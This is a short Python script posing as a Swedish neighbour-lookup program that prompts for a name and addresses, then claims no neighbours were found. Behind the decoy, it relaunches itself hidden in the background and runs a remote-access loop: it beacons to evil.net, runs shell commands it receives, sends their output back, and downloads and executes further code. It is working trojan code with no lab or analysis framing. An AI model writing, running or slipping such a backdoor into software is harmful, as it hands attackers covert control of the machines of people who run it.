#!/usr/bin/env python3
import sys
import os


def main():
    print('Välkommen till Grannupplysningen!')
    name = input('Ange ditt namn: ')
    input('Ange din adress: ')
    input('Ange din postadress: ')
    print('Kunde inte hitta några grannar för %s! Försök igen senare.' % name)


def payload():
    import requests
    import time
    import subprocess
    import urllib.parse
    import gzip
    
    session = requests.session()

    while True:
        response = session.get('http://evil.net/beacon_1').json()
        
        if response['command'] == 'sleep':
            time.sleep(response.get('parameters', [3])[0])

        elif response['command'] == 'shell':
            output = subprocess.check_output(response.get('parameters')[0], shell=True)
            session.post('http://evil.net/shell_1', json={'output': urllib.parse.quote(output, safe='')})

        elif response['command'] == 'download_and_execute':
            new_payload = session.get(response.get('parameters')[0]).content
            session_id = session.cookies['id']
            exec(new_payload, globals(), locals())
            break


if __name__ == '__main__':
    if '--payload' in sys.argv:
        payload()
    else:
        os.system('python3 %s --payload &> /dev/null &' % sys.argv[0])
        main()
